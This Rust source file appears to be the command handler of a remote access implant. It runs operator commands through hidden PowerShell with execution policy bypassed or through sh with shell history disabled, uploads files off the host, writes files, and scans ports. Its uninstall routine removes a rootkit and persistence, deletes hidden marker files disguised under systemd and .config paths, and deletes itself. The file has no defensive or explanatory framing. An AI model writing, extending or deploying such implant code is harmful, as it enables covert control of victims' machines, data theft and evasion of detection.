use std::process::Command;

pub fn execute_command(cmd: &str) -> String {
    let mut cmd = cmd.to_string();
    let mut is_interactive = false;

    if cmd.starts_with("interactive:") {
        is_interactive = true;
        cmd = cmd.strip_prefix("interactive:").unwrap().to_string();
    }

    if cmd.starts_with("uninstall") {
        return handle_uninstall();
    }

    if cmd == "ls" || cmd.starts_with("ls ") {
        let path = cmd.strip_prefix("ls").unwrap().trim();
        return crate::files::list_files(path);
    }
    if cmd == "dir" || cmd.starts_with("dir ") {
        let path = cmd.strip_prefix("dir").unwrap().trim();
        return crate::files::list_files(path);
    }

    if cmd.starts_with("upload ") {
        let path = cmd.strip_prefix("upload ").unwrap().trim();
        return match crate::filetransfer::upload_file(path) {
            Ok(payload) => format!("[FILE_UPLOAD_JSON]\n{}", payload),
            Err(e) => e,
        };
    }

    if cmd.starts_with("readfile ") {
        let path = cmd.strip_prefix("readfile ").unwrap().trim();
        return match crate::filetransfer::preview_file(path) {
            Ok(msg) => msg,
            Err(e) => e,
        };
    }

    if cmd.starts_with("download ") {
        let rest = &cmd[9..];
        if let Some(last_space) = rest.rfind(' ') {
            let path = &rest[..last_space];
            let data = &rest[last_space + 1..];
            return match crate::filetransfer::download_file(path, data) {
                Ok(msg) => msg,
                Err(e) => e,
            };
        }
        return "Usage: download /path/to/save <base64data>".to_string();
    }

    if cmd.starts_with("upload_chunk ") {
        let payload = cmd.strip_prefix("upload_chunk ").unwrap().trim();
        return match serde_json::from_str::<crate::filetransfer::UploadChunkRequest>(payload) {
            Ok(request) => match crate::filetransfer::handle_upload_chunk(request) {
                Ok(msg) => msg,
                Err(e) => e,
            },
            Err(e) => format!("Error: {}", e),
        };
    }

    if cmd.starts_with("scan ") {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.len() >= 3 {
            return crate::scan::scan_ports(parts[1], parts[2]);
        }
        return "Usage: scan <host> <ports>".to_string();
    }

    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;

        if cmd.starts_with("cmd:") {
            let actual_cmd = &cmd[4..];
            let mut command = Command::new("cmd");
            command.args(&["/c", actual_cmd]);
            command.creation_flags(0x08000000);
            command.output()
        } else {
            let mut command = Command::new("powershell");
            command.arg("-NoProfile");
            if !is_interactive {
                command.arg("-NonInteractive");
            }
            command.args(&["-ExecutionPolicy", "Bypass", "-Command", &cmd]);
            command.creation_flags(0x08000000);
            command.output()
        }
    };

    #[cfg(unix)]
    let output = {
        let has_timeout = Command::new("which")
            .arg("timeout")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);

        let mut command = if has_timeout {
            let mut c = Command::new("timeout");
            c.args(&["120", "sh", "-c", &cmd]);
            c
        } else {
            let mut c = Command::new("sh");
            c.args(&["-c", &cmd]);
            c
        };

        if !is_interactive {
            command.env("HISTFILE", "/dev/null");
        }
        command.output()
    };

    match output {
        Ok(o) => {
            let mut result = String::from_utf8_lossy(&o.stdout).to_string();
            result.push_str(&String::from_utf8_lossy(&o.stderr));

            if result.len() > 102400 {
                let mut end = 102400;
                while end > 0 && !result.is_char_boundary(end) {
                    end -= 1;
                }
                format!("{}...\n[Output truncated]", &result[..end])
            } else {
                result
            }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn handle_uninstall() -> String {
    #[cfg(unix)]
    {
        let _ = crate::rootkit::uninstall_rootkit();
    }

    let _ = crate::persist::uninstall_persistence();

    #[cfg(windows)]
    {
        let username = whoami::username();
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\issue.txt",
            username
        ));
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\agent_id.txt",
            username
        ));
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\agent_debug.log",
            username
        ));
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\last_comment.txt",
            username
        ));
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            let _ = std::fs::remove_file("/var/lib/systemd/.issue");
            let _ = std::fs::remove_file("/var/lib/systemd/.agent_id");
            let _ = std::fs::remove_file("/var/lib/systemd/.last_comment");
            let _ = std::fs::remove_file("/var/log/.systemd-debug.log");
        } else {
            let home = std::env::var("HOME").unwrap_or_default();
            let _ = std::fs::remove_file(format!("{}/.local/share/.issue", home));
            let _ = std::fs::remove_file(format!("{}/.local/share/.agent_id", home));
            let _ = std::fs::remove_file(format!("{}/.local/share/.last_comment", home));
            let _ = std::fs::remove_file(format!("{}/.local/share/.agent-debug.log", home));
        }
    }

    std::thread::spawn(|| {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = crate::selfdel::self_delete();
        std::process::exit(0);
    });

    "Uninstalling...".to_string()
}
